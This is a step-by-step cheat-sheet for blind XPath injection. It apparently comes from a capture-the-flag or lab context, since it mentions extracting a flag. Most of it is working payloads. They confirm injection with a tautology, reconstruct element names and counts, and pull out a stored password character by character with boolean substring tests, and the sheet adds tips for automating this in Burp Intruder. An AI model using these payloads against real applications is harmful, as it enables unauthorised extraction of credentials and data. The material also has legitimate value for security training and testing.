# Step-by-step XPath exfiltration cheat-sheet (concise)

**Goal:** discover XML structure, element names, lengths, and exfiltrate text values (e.g., a flag) using boolean XPath tests.

---

## 1) Confirm injection is possible

Inject a tautology and look for a response difference.

Payload (concept):
`invalid' or '1'='1`
(Real payload must match the app’s quoting; you may need to escape/URL-encode.)

---

## 2) Discover root element name and length

* Root name length:
  `string-length(name(/*)) = N`
* Root name character at position `i`:
  `substring(name(/*), i, 1) = 'x' and '1'='1`

Example tests:
`string-length(name(/*)) = 8 and '1'='1`
`substring(name(/*),1,1) = 'a' and '1'='1`

---

## 3) Count child elements (discover how many child nodes)

* Count children of root (e.g., `/accounts`):
  `count(/accounts/*) = 2 and '1'='1`

* Count children of a specific child (e.g., first `<acc>`):
  `count(/accounts/acc[1]/*) = 2 and '1'='1`  (shows `username` and `password`)

---

## 4) Discover child *tag names* (length and characters)

* Length of first child tag name:
  `string-length(name(/accounts/*[1])) = 3 and '1'='1`
* Character checks:
  `substring(name(/accounts/*[1]), 1, 1) = 'a' and '1'='1`
  Repeat for positions 1..len to reconstruct the tag name (`acc`).

Remember: tag name extraction uses `name()`; content extraction uses the node itself.

---

## 5) Discover number of fields inside an element (e.g., inside `<acc>`)

* `count(/accounts/acc[1]/*) = 2`

---

## 6) Get length of an element’s text value (e.g., password)

* `string-length(/accounts/acc[1]/password) = 37 and '1'='1`

This returns the length of the **text content** of `/accounts/acc[1]/password`.

---

## 7) Extract characters one-by-one (value extraction)

* Character at position `i` of the password:
  `substring(/accounts/acc[1]/password, i, 1) = 'p' and '1'='1`
  Increment `i` from `1..length` to recover the whole string.

---

## 8) Practical payload template & encoding notes

* Typical injected HTTP parameter template (example if param is single-quoted in server XPath):
  `...param='invalid' or <XPATH_CONDITION> and '1'='1'...`
* Make sure to:

  * Match the surrounding quotes the application uses (single or double).
  * URL-encode and escape payloads when sending via HTTP (Burp Intruder or Repeater does this for you).
  * When automating with Intruder, use a numeric payload list for positions (1..N) and an alphabet list for characters.

---

## 9) Automation tip (Burp Intruder)

* Phase 1: find lengths with a numeric list (0..9) for `string-length(...)`.
* Phase 2: extract characters using a character set (a–zA–Z0–9 and symbols) as payloads for `substring(...,POS,1)`.
* Use distinct payload positions for `POS` and for which node index (`acc[1]` vs `acc[2]`).

---

## 10) Common pitfalls & fixes

* Distinguish **element name** vs **element value**: `name()` vs node string-value.
* XPath indexing starts at **1** (not 0).
* Some servers use XPath 1.0 — functions here are XPath-1.0 compatible.
* If tests always return true/false the same, check for server-side sanitization, different quote context, or application returning identical pages for both outcomes.

---

## 11) Clean example sequence

1. Confirm injection: `invalid' or '1'='1`
2. `string-length(name(/*)) = 8` → root name length 8
3. `count(/accounts/*) = 2` → two `<acc>` children
4. `string-length(name(/accounts/*[1])) = 3` → child tag length = 3 (`acc`)
5. `count(/accounts/acc[1]/*) = 2` → fields: `username`, `password`
6. `string-length(/accounts/acc[1]/password) = 37` → password length 37
7. `substring(/accounts/acc[1]/password,1,1) = 'H'` → first char; repeat to recover full password

